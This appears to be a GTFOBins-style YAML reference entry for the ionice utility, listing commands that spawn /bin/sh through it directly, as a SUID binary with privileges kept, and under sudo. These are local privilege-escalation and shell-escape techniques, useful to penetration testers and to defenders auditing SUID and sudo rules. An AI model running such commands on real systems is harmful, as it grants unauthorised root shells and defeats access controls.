---
functions:
  shell:
    - code: ionice /bin/sh
  suid:
    - code: ./ionice /bin/sh -p
  sudo:
    - code: sudo ionice /bin/sh
---
